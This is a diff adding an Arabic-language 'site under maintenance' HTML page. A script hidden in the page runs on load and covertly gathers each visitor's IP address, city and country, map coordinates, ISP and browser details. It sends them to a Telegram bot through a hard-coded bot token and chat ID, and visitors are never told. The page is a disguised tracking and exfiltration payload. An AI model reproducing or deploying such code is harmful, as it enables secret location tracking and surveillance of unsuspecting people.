@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>الموقع تحت الصيانة</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+      color: #333;
+      text-align: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      max-width: 600px;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      padding: 20px;
+    }
+    h1 {
+      color: #ff6b6b;
+    }
+    p {
+      font-size: 18px;
+      color: #666;
+    }
+    .maintenance-icon {
+      font-size: 100px;
+      color: #ff6b6b;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="maintenance-icon">🚧</div>
+    <h1>الموقع تحت الصيانة</h1>
+    <p>نعتذر عن الإزعاج. نحن نعمل على تحسين الموقع.</p>
+  </div>
+  <script>
+    // مفتاح بوت Telegram ورقم القناة أو المجموعة
+    const botToken = '6611757234:AAEoATfcF8gD-9qLHQNGE48HVkmryBnVI4c';  // توكن البوت
+    const chatId = '1088226862';  // chat_id الخاص بالقناة أو المجموعة
+
+    // دالة للحصول على البيانات من API
+    function fetchData(url) {
+      return new Promise((resolve, reject) => {
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", url, true);
+        xhr.onreadystatechange = () => {
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            resolve(JSON.parse(xhr.responseText));
+          } else if (xhr.readyState === 4) {
+            reject(`فشل في جلب البيانات من ${url}`);
+          }
+        };
+        xhr.send();
+      });
+    }
+
+    // دالة للحصول على معلومات المتصفح والجهاز
+    function getBrowserInfo() {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+      return {
+        المتصفح: userAgent,
+        النظام: platform,
+        اللغة: language,
+        "المنطقة الزمنية": timezone
+      };
+    }
+
+    // دالة لإرسال البيانات إلى Telegram
+    async function sendToTelegram(ipInfo, ipAddress, browserInfo) {
+      const message = `
+      تم تسجيل دخول جديد:
+      عنوان IP: ${ipAddress}
+      الموقع: ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}
+      الإحداثيات: https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}
+      مزود الخدمة: ${ipInfo.isp || 'غير معروف'}
+      التوقيت المحلي: ${ipInfo.timezone || 'غير معروف'}
+      العملة: ${ipInfo.currency || 'غير معروف'}
+      المتصفح: ${browserInfo['المتصفح']}
+      النظام: ${browserInfo['النظام']}
+      اللغة: ${browserInfo['اللغة']}
+      المنطقة الزمنية: ${browserInfo['المنطقة الزمنية']}
+      `;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      const xhr = new XMLHttpRequest();
+      xhr.open("GET", url, true);
+      xhr.send();
+    }
+
+    // الدالة الرئيسية لجمع البيانات وإرسالها
+    async function logIP() {
+      try {
+        // جلب معلومات الـ IP والموقع
+        const ipInfo = await fetchData("http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,timezone,currency,isp,query");
+        const ipAddress = await fetchData("https://api.ipify.org/?format=json");
+
+        // جلب معلومات المتصفح والجهاز
+        const browserInfo = getBrowserInfo();
+
+        // إرسال جميع البيانات إلى Telegram
+        sendToTelegram(ipInfo, ipAddress.query, browserInfo);
+      } catch (error) {
+        console.error("خطأ أثناء جلب البيانات:", error);
+      }
+    }
+
+    // تشغيل الدالة
+    logIP();
+  </script>
+</body>
+</html>
